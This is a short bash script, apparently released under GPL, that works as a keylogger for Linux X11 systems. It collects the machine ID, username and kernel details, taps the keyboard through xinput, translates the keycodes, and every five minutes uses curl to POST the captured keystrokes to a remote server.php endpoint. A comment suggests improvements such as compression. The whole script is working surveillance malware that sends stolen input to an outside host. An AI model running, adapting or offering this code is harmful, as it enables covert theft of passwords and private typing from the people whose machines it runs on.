#!/bin/bash
# Copyright (C) 2018 Alexandre-Xavier Labonté-Lamoureux
# License: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
# This is free software; you are free to change and redistribute it.
# There is NO WARRANTY, to the extent permitted by law.

keycodes="/tmp/keycodes"
translation="/tmp/translation"

function capture {
	xinput --test $1 | grep --line-buffered "key press" | awk '{print $3; system("");}' > $keycodes
}

# Identify the computer and the user
computerid=$(cat /var/lib/dbus/machine-id)
uname=$(uname -srm)
me=$(whoami)

echo "Hi $me, your ID is: $computerid"

# Get keyboard string. The name of the targeted device must be added to the grep.
devline=$(xinput list | grep -e 'AT Translated Set 2 keyboard' -e 'USB Keyboard')

# Get the device ID string
idstr=$(echo $devline | grep -Po 'id=[0-9]*')

# Extract device ID number
idnum=$(echo $idstr | grep -Po '[0-9]*')

echo "Your keyboard has device number $idnum"

# Get the map of the keyboard
keymap=$(xmodmap -pke)

IFS=$'\n' GLOBIGNORE='*' command eval 'KEYS=($keymap)'

# Build array to match de keycodes with the key
for element in "${KEYS[@]}"; do
	keyid=$(echo "$element" | awk '{print $2; system("");}')
	keyname=$(echo "$element" | awk '{print $4; system("");}')

	# Some keycodes don't have a representation
	if [ ! -z "$keyname" ]; then
		KEY_ARRAY[$keyid]=$keyname
	fi
done

# Delete any files that was created by a previous instance
rm -f $keycodes
rm -f $translation

# Run this in parallel
capture $idnum &

max=0

while true; do
	echo "waiting..."
	sleep 5m		# Every 5 minutes

	count=$(cat $keycodes | wc -c)

	if [ "$count" -gt "$max" ]; then
		max=$count

		while read p; do
			echo "${KEY_ARRAY[$p]} " >> $translation
		done < $keycodes

		# Improvements: 1- Compress the data, 2- Send the start date of the capture so the server doesn't overwrite the same file
		curl -X POST --header "cpu: $computerid" -A "$me on $uname" -d @$translation http://yoursite.com/server.php

		rm -f $translation

		echo "sent"
	fi
done
